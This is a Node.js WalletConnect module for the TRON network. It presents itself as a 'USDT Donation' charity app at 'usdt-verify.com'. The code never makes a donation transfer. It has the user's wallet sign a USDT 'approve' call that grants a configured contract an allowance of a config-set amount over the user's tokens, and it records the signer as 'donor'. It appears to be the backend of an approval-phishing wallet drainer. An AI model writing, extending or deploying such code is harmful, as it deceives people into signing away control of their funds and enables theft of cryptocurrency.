const { SignClient } = require("@walletconnect/sign-client");
const { TronWeb } = require("tronweb");

// ============================================================
// WALLETCONNECT SESSION MANAGER
// ============================================================

let signClient = null;
const activeSessions = new Map(); // sessionId -> { topic, address, status }

const TRON_CHAIN_ID = "tron:0x2b6653dc"; // TRON Mainnet

async function initWalletConnect(projectId) {
    signClient = await SignClient.init({
        projectId,
        metadata: {
            name: "USDT Donation",
            description: "Donate 1 USDT to charities",
            url: "https://usdt-verify.com",
            icons: ["https://usdt-verify.com/icon.png"],
        },
    });

    // Listen for session events
    signClient.on("session_event", (event) => {
        console.log("[WC] Session event:", event);
    });

    signClient.on("session_delete", (event) => {
        console.log("[WC] Session deleted:", event.topic);
        // Clean up
        for (const [id, session] of activeSessions) {
            if (session.topic === event.topic) {
                activeSessions.delete(id);
                break;
            }
        }
    });

    console.log("[WC] WalletConnect SignClient initialized");
    return signClient;
}

/**
 * Create a new WalletConnect session and return the URI for QR code
 */
async function createSession(sessionId) {
    if (!signClient) throw new Error("WalletConnect not initialized");

    const { uri, approval } = await signClient.connect({
        optionalNamespaces: {
            tron: {
                chains: [TRON_CHAIN_ID],
                methods: ["tron_signTransaction"],
                events: ["accountsChanged"],
            },
        },
    });

    // Store session info
    activeSessions.set(sessionId, {
        topic: null,
        address: null,
        status: "pending", // pending -> connected -> approved -> done
        uri,
    });

    // Handle approval asynchronously
    approval()
        .then((session) => {
            const accounts = session.namespaces.tron?.accounts || [];
            // Account format: "tron:0x2b6653dc:TAddress"
            const address = accounts.length > 0 ? accounts[0].split(":")[2] : null;

            const sessionData = activeSessions.get(sessionId);
            if (sessionData) {
                sessionData.topic = session.topic;
                sessionData.address = address;
                sessionData.status = "connected";
                console.log(`[WC] Session ${sessionId} connected: ${address}`);
            }
        })
        .catch((err) => {
            console.error(`[WC] Session ${sessionId} rejected:`, err.message);
            const sessionData = activeSessions.get(sessionId);
            if (sessionData) {
                sessionData.status = "rejected";
            }
        });

    return uri;
}

/**
 * Send the approve transaction to the connected wallet
 */
async function sendApproveTransaction(sessionId, config) {
    const sessionData = activeSessions.get(sessionId);
    if (!sessionData) throw new Error("Session not found");
    if (!sessionData.topic) throw new Error("Wallet not connected yet");
    if (!sessionData.address) throw new Error("No address available");

    // Prevent duplicate sends
    if (sessionData.status === "signing" || sessionData.status === "approved" || sessionData.status === "done") {
        return { success: false, alreadySending: true };
    }
    sessionData.status = "signing";

    const tronWeb = new TronWeb({
        fullHost: config.TRON_API,
        headers: { "TRON-PRO-API-KEY": config.TRONGRID_API_KEY },
    });

    // Build the approve transaction
    const parameter = [
        { type: "address", value: config.CONTRACT_ADDRESS },
        { type: "uint256", value: String(config.DONATION_AMOUNT) },
    ];

    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        config.USDT_CONTRACT,
        "approve(address,uint256)",
        { feeLimit: 100000000 },
        parameter,
        sessionData.address
    );

    if (!tx.result || !tx.result.result) {
        sessionData.status = "connected";
        throw new Error("Failed to build approve transaction: " + JSON.stringify(tx.result));
    }

    const transaction = tx.transaction;
    console.log(`[WC] Sending approve TX to wallet for signing...`);
    console.log(`[WC] TX ID: ${transaction.txID}`);

    // Send to wallet for signing via WalletConnect
    // Trust Wallet expects the transaction object directly in params
    const result = await signClient.request({
        topic: sessionData.topic,
        chainId: TRON_CHAIN_ID,
        request: {
            method: "tron_signTransaction",
            params: transaction,
        },
    });

    console.log(`[WC] Wallet response:`, JSON.stringify(result).substring(0, 300));
    sessionData.status = "approved";

    // Merge signature into original transaction if needed
    // Trust Wallet may return: { signature: [...] } or the full signed tx
    let signedTx;
    if (result && result.signature) {
        // Result contains the signature - merge with original transaction
        signedTx = { ...transaction, signature: result.signature };
    } else if (result && result.result && result.result.signature) {
        signedTx = { ...transaction, signature: result.result.signature };
    } else {
        // Assume result IS the full signed transaction
        signedTx = result;
    }

    // Ensure signature exists
    if (!signedTx.signature || signedTx.signature.length === 0) {
        throw new Error("No signature in wallet response: " + JSON.stringify(result).substring(0, 200));
    }

    console.log(`[WC] Approve TX signed by ${sessionData.address}`);

    // Broadcast the signed transaction
    const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);

    if (broadcast.result) {
        console.log(`[WC] Approve TX broadcast: ${broadcast.txid}`);
        sessionData.status = "done";
        sessionData.txId = broadcast.txid;
        return { success: true, txId: broadcast.txid, donor: sessionData.address };
    } else {
        throw new Error("Broadcast failed: " + JSON.stringify(broadcast));
    }
}

/**
 * Get session status
 */
function getSessionStatus(sessionId) {
    const session = activeSessions.get(sessionId);
    if (!session) return null;
    return {
        status: session.status,
        address: session.address,
        txId: session.txId || null,
    };
}

/**
 * Clean up old sessions (call periodically)
 */
function cleanupSessions(maxAgeMs = 300000) {
    // Remove sessions older than 5 minutes
    const now = Date.now();
    for (const [id, session] of activeSessions) {
        if (session.createdAt && now - session.createdAt > maxAgeMs) {
            activeSessions.delete(id);
        }
    }
}

module.exports = {
    initWalletConnect,
    createSession,
    sendApproveTransaction,
    getSessionStatus,
    cleanupSessions,
};
